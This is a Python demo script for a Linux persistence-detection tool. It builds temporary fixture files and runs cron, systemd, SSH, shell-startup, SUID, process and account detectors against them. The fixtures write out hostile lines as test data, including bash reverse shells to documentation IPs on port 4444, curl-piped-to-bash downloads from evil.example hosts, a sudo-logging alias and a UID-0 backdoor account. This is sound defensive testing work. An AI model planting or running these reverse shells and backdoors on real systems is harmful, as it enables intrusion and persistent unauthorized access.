import json
from pathlib import Path
from tempfile import TemporaryDirectory

from persisthunt.findings import Finding, FindingCollection, Severity
from persisthunt.detectors.cron import CronDetector
from persisthunt.detectors.systemd import SystemdDetector
from persisthunt.detectors.ssh import SSHDetector
from persisthunt.detectors.shell import ShellDetector
from persisthunt.detectors.suid import SuidDetector
from persisthunt.detectors.process import ProcessDetector
from persisthunt.detectors.account import AccountDetector
from persisthunt.risk import RiskScorer, RiskReport, calculate_risk

def demo_stage1_findings():
    print("=== Stage 1: Finding Model & Collection Demo ===")
    collection = FindingCollection()

    # 1 INFO finding
    collection.add(Finding(
        id="PH-TEST-001", category="general", severity=Severity.INFO,
        title="Info level finding", description="Just some info."
    ))

    # 1 LOW finding
    collection.add(Finding(
        id="PH-TEST-002", category="general", severity=Severity.LOW,
        title="Low level finding", description="A low severity issue."
    ))

    # 1 MEDIUM finding
    collection.add(Finding(
        id="PH-TEST-003", category="general", severity=Severity.MEDIUM,
        title="Medium level finding", description="A medium severity issue."
    ))

    # 1 HIGH finding
    collection.add(Finding(
        id="PH-TEST-004", category="systemd", severity=Severity.HIGH,
        title="High level finding", description="A high severity issue.",
        evidence="ExecStart=/tmp/malicious"
    ))

    # 1 CRITICAL finding
    collection.add(Finding(
        id="PH-TEST-005", category="cron", severity=Severity.CRITICAL,
        title="Critical level finding", description="A critical severity issue."
    ))

    print("--- Stored Findings ---")
    print(f"Total stored: {collection.count()} (Expected: 5)")

    print("\n--- Filtering by Severity (HIGH) ---")
    highs = collection.by_severity(Severity.HIGH)
    print(f"High severity findings: {len(highs)} (Expected: 1)")
    print(f"ID: {highs[0].id}")

    print("\n--- Filtering by Category (systemd) ---")
    sys_cats = collection.by_category("systemd")
    print(f"Systemd findings: {len(sys_cats)} (Expected: 1)")

    print("\n--- Statistics ---")
    stats = collection.severity_counts()
    for k, v in stats.items():
        print(f"{k}: {v}")


def demo_stage2_cron_detector():
    print("\n=== Stage 2: Cron Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (Cron) ---")
    detector = CronDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host cron findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious indicators
    print("\n--- Scanning Controlled Suspicious Cron Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc_crontab = root / "etc" / "crontab"
        cron_d = root / "etc" / "cron.d"
        cron_daily = root / "etc" / "cron.daily"
        spool = root / "var" / "spool" / "cron" / "crontabs"

        cron_d.mkdir(parents=True)
        cron_daily.mkdir(parents=True)
        spool.mkdir(parents=True)

        # Suspicious entries
        etc_crontab.write_text(
            "# System crontab with benign and suspicious entries\n"
            "SHELL=/bin/sh\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n"
            "0 1 * * * root /usr/bin/backup-logs.sh\n"
            "* * * * * root /bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1\n"
        )

        (cron_d / "updater").write_text(
            "* * * * * root curl -fsSL https://malicious.example/payload.sh | bash\n"
            "0 0 * * * root /tmp/staged_script.sh\n"
        )

        (spool / "bob").write_text(
            "*/10 * * * * python3 -c 'import socket; print(1)'\n"
        )

        mock_detector = CronDetector(root_prefix=root)
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()


def demo_stage3_systemd_detector():
    print("\n=== Stage 3: Systemd Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (Systemd) ---")
    detector = SystemdDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host systemd findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious indicators
    print("\n--- Scanning Controlled Suspicious Systemd Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc_systemd = root / "etc" / "systemd" / "system"
        etc_systemd.mkdir(parents=True)

        # Suspicious unit 1: execution out of /tmp
        (etc_systemd / "backdoor.service").write_text(
            "[Unit]\n"
            "Description=Critical System Service\n"
            "[Service]\n"
            "Type=simple\n"
            "ExecStart=/tmp/backdoor_daemon\n"
            "Restart=always\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )

        # Suspicious unit 2: download piped to shell
        (etc_systemd / "sysupdater.service").write_text(
            "[Unit]\n"
            "Description=Periodic Updater\n"
            "[Service]\n"
            "ExecStart=/bin/sh -c 'curl -fsSL https://evil.example/agent.sh | bash'\n"
        )

        # Suspicious unit 3: reverse shell socket
        (etc_systemd / "debug.service").write_text(
            "[Unit]\n"
            "Description=Debug Service\n"
            "[Service]\n"
            "ExecStart=/bin/bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n"
        )

        mock_detector = SystemdDetector(root_prefix=root)
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()


def demo_stage4_ssh_detector():
    print("\n=== Stage 4: SSH Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (SSH) ---")
    detector = SSHDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host SSH findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious SSH persistence
    print("\n--- Scanning Controlled Suspicious SSH Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        user_ssh = root / "home" / "victim" / ".ssh"
        user_ssh.mkdir(parents=True)
        user_ssh.chmod(0o700)

        # Suspicious forced command with indicator
        auth_keys = user_ssh / "authorized_keys"
        auth_keys.write_text(
            'command="/tmp/backdoor.sh",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMq1f9z57U7bFk9s01o8fG/exampleBlob12345 evil@remote\n'
        )
        auth_keys.chmod(0o600)

        # Service account with authorized keys
        svc_ssh = root / "var" / "www" / ".ssh"
        svc_ssh.mkdir(parents=True)
        (svc_ssh / "authorized_keys").write_text(
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7dummyRsaPublicBlob67890 web-shell@attacker\n"
        )

        # Insecure SSH daemon config
        etc_ssh = root / "etc" / "ssh"
        etc_ssh.mkdir(parents=True)
        (etc_ssh / "sshd_config").write_text(
            "PermitEmptyPasswords yes\n"
            "PermitRootLogin yes\n"
        )

        mock_detector = SSHDetector(
            root_prefix=root,
            service_account_dirs=[root / "var" / "www"],
        )
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()


def demo_stage5_shell_detector():
    print("\n=== Stage 5: Shell Startup Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (Shell Startup) ---")
    detector = ShellDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host Shell findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious shell persistence
    print("\n--- Scanning Controlled Suspicious Shell Startup Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc = root / "etc"
        etc.mkdir(parents=True)
        user_home = root / "home" / "victim"
        user_home.mkdir(parents=True)

        # Injected backdoor into .bashrc
        (user_home / ".bashrc").write_text(
            "# Standard bashrc with persistent backdoor\n"
            "export PATH=$PATH:/usr/local/bin\n"
            "curl -fsSL https://evil.example/agent.sh | bash &\n"
            "/tmp/persist_beacon.sh &\n"
            "alias sudo='/tmp/.sudo_logger'\n"
        )

        # System profile with reverse shell
        (etc / "profile").write_text(
            "# System profile\n"
            "/bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1 &\n"
        )

        mock_detector = ShellDetector(
            root_prefix=root,
            system_files=[etc / "profile"],
            system_dirs=[],
            home_dir=root / "home",
        )
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()

def demo_stage6_suid_detector():
    print("\n=== Stage 6: SUID/SGID Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (SUID/SGID) ---")
    detector = SuidDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host SUID/SGID findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious SUID/SGID binaries
    print("\n--- Scanning Controlled Suspicious SUID/SGID Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        usr_bin = root / "usr" / "bin"
        usr_bin.mkdir(parents=True)
        tmp = root / "tmp"
        tmp.mkdir(parents=True)
        opt = root / "opt"
        opt.mkdir(parents=True)
        user_home = root / "home" / "victim"
        user_home.mkdir(parents=True)

        # 1. Standard system SUID binary (passwd) -> INFO
        passwd_bin = usr_bin / "passwd"
        passwd_bin.write_bytes(b"\x7fELF\x02\x01\x01\x00")
        passwd_bin.chmod(0o4755)

        # 2. SUID shell interpreter (/usr/bin/bash) -> HIGH
        bash_bin = usr_bin / "bash"
        bash_bin.write_bytes(b"\x7fELF\x02\x01\x01\x00")
        bash_bin.chmod(0o4755)

        # 3. SUID binary staged in temporary directory -> HIGH
        backdoor_tmp = tmp / "priv_backdoor"
        backdoor_tmp.write_bytes(b"\x7fELF\x02\x01\x01\x00")
        backdoor_tmp.chmod(0o4755)

        # 4. Insecure world-writable SUID binary in /opt -> CRITICAL & MEDIUM
        insecure_tool = opt / "legacy_daemon"
        insecure_tool.write_bytes(b"\x7fELF\x02\x01\x01\x00")
        insecure_tool.chmod(0o4777)

        # 5. SUID binary in user home directory -> HIGH
        user_agent = user_home / "stealth_agent"
        user_agent.write_bytes(b"\x7fELF\x02\x01\x01\x00")
        user_agent.chmod(0o4755)

        mock_detector = SuidDetector(root_prefix=root)
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()

        print("--- SUID Fixture Findings JSON Output ---")
        print(json.dumps(mock_findings.to_dict(), indent=2))


def demo_stage7_process_and_account_detectors():
    print("\n=== Stage 7: Process & Account Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System (Processes) ---")
    proc_detector = ProcessDetector()
    proc_findings = proc_detector.scan()
    print(f"Host Process findings detected: {proc_findings.count()}")
    print(f"Host Process severity distribution: {proc_findings.severity_counts()}")

    print("\n--- Scanning Local Host System (Accounts) ---")
    acct_detector = AccountDetector()
    acct_findings = acct_detector.scan()
    print(f"Host Account findings detected: {acct_findings.count()}")
    print(f"Host Account severity distribution: {acct_findings.severity_counts()}")

    # 2. Emulated audit with suspicious Process fixture
    print("\n--- Scanning Controlled Suspicious Process Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        proc_dir = root / "proc"
        proc_dir.mkdir(parents=True)

        def add_proc(pid, comm, ppid=1, uid=1000, args=None, exe=None):
            pdir = proc_dir / str(pid)
            pdir.mkdir(parents=True, exist_ok=True)
            (pdir / "status").write_text(f"Name:\t{comm}\nPPid:\t{ppid}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
            if args:
                (pdir / "cmdline").write_bytes(b"\x00".join(a.encode() for a in args) + b"\x00")
            else:
                (pdir / "cmdline").write_bytes(b"")
            if exe:
                import os
                os.symlink(exe, pdir / "exe")

        # Process 1: nginx spawning interactive shell -> PH-PROC-005
        add_proc(500, "nginx", ppid=1, uid=33, args=["nginx: master process"], exe="/usr/sbin/nginx")
        add_proc(501, "sh", ppid=500, uid=33, args=["/bin/sh"], exe="/bin/sh")

        # Process 2: Deleted binary running in memory -> PH-PROC-003
        add_proc(600, "stealth_worker", ppid=1, uid=1000, args=["/opt/stealth_worker"], exe="/opt/stealth_worker (deleted)")

        # Process 3: Staged in /tmp with credentials to sanitize -> PH-PROC-001
        add_proc(700, "backdoor", ppid=1, uid=0, args=["/tmp/backdoor", "--password", "SuperSecretPass123!"], exe="/tmp/backdoor")

        # Process 4: Reverse shell -> PH-PROC-004
        add_proc(800, "bash", ppid=1, uid=1000, args=["/bin/bash", "-i", ">&", "/dev/tcp/198.51.100.1/4444", "0>&1"], exe="/bin/bash")

        mock_proc_det = ProcessDetector(proc_dir=proc_dir)
        mock_proc_findings = mock_proc_det.scan()

        print(f"Process fixture findings: {mock_proc_findings.count()}")
        print(f"Severity breakdown: {mock_proc_findings.severity_counts()}")
        print("\nProcess findings detail:")
        for f in mock_proc_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()

    # 3. Emulated audit with suspicious Account fixture
    print("\n--- Scanning Controlled Suspicious Account Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc = root / "etc"
        etc.mkdir(parents=True)

        # 1. Backdoor UID 0 user -> PH-ACCT-001 (CRITICAL)
        # 2. Service account with interactive shell -> PH-ACCT-002 (HIGH)
        # 3. Account with /tmp home -> PH-ACCT-003 (HIGH)
        # 4. Standard account -> zero findings
        (etc / "passwd").write_text(
            "root:x:0:0:root:/root:/bin/bash\n"
            "toor:x:0:0:Backdoor Root:/root:/bin/bash\n"
            "www-data:x:33:33:www-data:/var/www:/bin/bash\n"
            "temp_agent:x:1001:1001::/tmp/agent_home:/bin/bash\n"
            "alice:x:1000:1000::/home/alice:/bin/bash\n"
        )

        (etc / "shadow").write_text(
            "root:$6$saltsalt$dummyhash:18000:0:99999:7:::\n"
            "toor:$6$saltsalt$dummyhash:18000:0:99999:7:::\n"
            "www-data:*:18000:0:99999:7:::\n"
            "temp_agent::19000:0:99999:7:::\n"  # Empty password -> PH-ACCT-004 (CRITICAL)
            "alice:$6$saltsalt$dummyhash:18000:0:99999:7:::\n"
        )

        (etc / "group").write_text(
            "root:x:0:\n"
            "sudo:x:27:alice\n"
        )

        mock_acct_det = AccountDetector(root_prefix=root)
        mock_acct_findings = mock_acct_det.scan()

        print(f"Account fixture findings: {mock_acct_findings.count()}")
        print(f"Severity breakdown: {mock_acct_findings.severity_counts()}")
        print("\nAccount findings detail:")
        for f in mock_acct_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()

        print("--- Account Fixture Findings JSON Output ---")
        print(json.dumps(mock_acct_findings.to_dict(), indent=2))


def demo_stage8_risk_scoring():
    print("\n=== Stage 8: Risk Scoring Engine Demo ===")

    # 1. Verification of the user-specified mixed severity scenario
    print("\n--- Scenario A: Standard Mixed-Severity Profile ---")
    collection = FindingCollection()
    collection.add(Finding(
        id="PH-CRIT-001", category="account", severity=Severity.CRITICAL,
        title="Secondary UID 0 Backdoor Account", description="Account 'toor' has UID 0.",
        location="/etc/passwd:toor"
    ))
    for i in range(2):
        collection.add(Finding(
            id=f"PH-HIGH-{i+1:03d}", category="process", severity=Severity.HIGH,
            title=f"High severity issue {i+1}", description="Suspicious process/startup issue.",
            location=f"PID {1000+i}"
        ))
    for i in range(4):
        collection.add(Finding(
            id=f"PH-MED-{i+1:03d}", category="cron", severity=Severity.MEDIUM,
            title=f"Medium severity issue {i+1}", description="Unusual scheduling/path issue.",
            location=f"/etc/cron.d/job{i+1}"
        ))
    for i in range(3):
        collection.add(Finding(
            id=f"PH-LOW-{i+1:03d}", category="systemd", severity=Severity.LOW,
            title=f"Low severity issue {i+1}", description="Minor configuration warning.",
            location=f"/etc/systemd/system/svc{i+1}.service"
        ))
    collection.add(Finding(
        id="PH-INFO-001", category="general", severity=Severity.INFO,
        title="Informational diagnostic observation", description="Standard diagnostic notice."
    ))

    report = calculate_risk(collection)
    print("Formatted Summary Output:")
    print(report.summary())

    print("\nDetailed Explainability Breakdown:")
    print(report.explain())

    # 2. Aggregated Live System Risk Assessment across all 6 Detectors
    print("\n--- Scenario B: Aggregated Live Host System Risk Audit ---")
    detectors = [
        CronDetector(),
        SystemdDetector(),
        SSHDetector(),
        ShellDetector(),
        SuidDetector(),
        ProcessDetector(),
        AccountDetector(),
    ]

    all_host_findings = FindingCollection()
    for d in detectors:
        findings = d.scan()
        for f in findings:
            all_host_findings.add(f)

    host_report = calculate_risk(all_host_findings)
    print(f"Total Host Findings Collected: {host_report.finding_count}")
    print(f"Overall Host Risk Score: {host_report.score:.1f} / {host_report.max_score:.0f}")
    print(f"Highest Severity Present: {host_report.highest_severity.value if host_report.highest_severity else 'None'}")
    print("\nHost Summary Report:")
    print(host_report.summary())


def main():
    demo_stage1_findings()
    demo_stage2_cron_detector()
    demo_stage3_systemd_detector()
    demo_stage4_ssh_detector()
    demo_stage5_shell_detector()
    demo_stage6_suid_detector()
    demo_stage7_process_and_account_detectors()
    demo_stage8_risk_scoring()

if __name__ == "__main__":
    main()


